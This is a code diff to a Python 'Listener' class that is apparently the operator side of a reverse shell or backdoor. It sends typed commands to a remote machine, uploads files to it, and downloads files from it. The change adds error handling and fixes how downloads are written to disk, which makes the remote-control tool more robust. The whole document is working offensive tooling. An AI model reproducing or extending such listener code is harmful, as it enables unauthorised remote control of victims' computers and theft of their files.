@@ -44,14 +44,20 @@ class Listener:
       while True:
          cmmd = input(">> ")
          cmmd = cmmd.split(" ")
-         if cmmd[0] == "upload":
-            file_content = self.read_file(cmmd[1])
-            cmmd.append(file_content)
-         elif cmmd[0] == "download":
-            result = self.write_file(cmmd[1], result)
-            
-         result = self.execute(cmmd)
 
+
+         try:
+            if cmmd[0] == "upload":
+               file_content = self.read_file(cmmd[1])
+               cmmd.append(file_content)
+
+            result = self.execute(cmmd)
+
+            if cmmd[0] == "download" and "[-] Error " not in result:
+               result = self.write_file(cmmd[1], result)
+         except Exception:
+            result = "\n[-] Error during command execution.\n"
+            
          print(result)
 
 Listener = Listener(str(sys.argv[1]), int(sys.argv[2]))
